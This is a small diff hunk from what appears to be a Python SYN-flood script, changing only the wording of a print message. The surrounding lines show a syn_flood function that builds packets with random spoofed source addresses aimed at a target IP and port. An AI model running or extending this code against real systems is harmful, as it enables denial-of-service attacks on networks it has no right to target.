@@ -11,7 +11,7 @@ def random_int():
 
 def syn_flood(dst_ip, dst_port, counter):
     total = 0
-    print("Packets are sending ...")
+    print("Packets are being sent ...")
     
     for _ in range(counter):
         IP_Packet = IP(src=random_ip(), dst=dst_ip)
